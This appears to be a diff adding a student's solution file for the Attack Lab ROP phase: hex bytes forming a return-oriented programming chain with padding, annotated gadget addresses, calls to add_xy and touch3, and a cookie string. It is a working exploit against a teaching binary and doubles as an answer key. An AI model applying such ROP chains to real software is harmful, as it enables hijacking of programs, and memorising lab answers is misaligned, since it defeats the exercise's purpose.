@@ -1,0 +1,20 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+06 1a 40 00 00 00 00 00 /* %rsp   -> %rax   */
+a2 19 40 00 00 00 00 00 /* %rax   -> %rdi   */
+ab 19 40 00 00 00 00 00 /* popq offset2%rax */
+48 00 00 00 00 00 00 00 
+dd 19 40 00 00 00 00 00 /* %rax   -> %rdx   */ 
+69 1a 40 00 00 00 00 00 /* %rdx   -> %rcx   */ 
+13 1a 40 00 00 00 00 00 /* %rcx   -> %rsi   */ 
+d6 19 40 00 00 00 00 00 /* call add_xy      */
+a2 19 40 00 00 00 00 00 /* %rax   -> %rdi   */
+fa 18 40 00 00 00 00 00 /* call touch3      */
+35 39 62 39 39 37 66 61 /* cookie string    */
+
+/* Note: cookie can also be moved upwards,    */
+/*       but that will introduce a extra      */
+/*       gadget, worse than official solution */
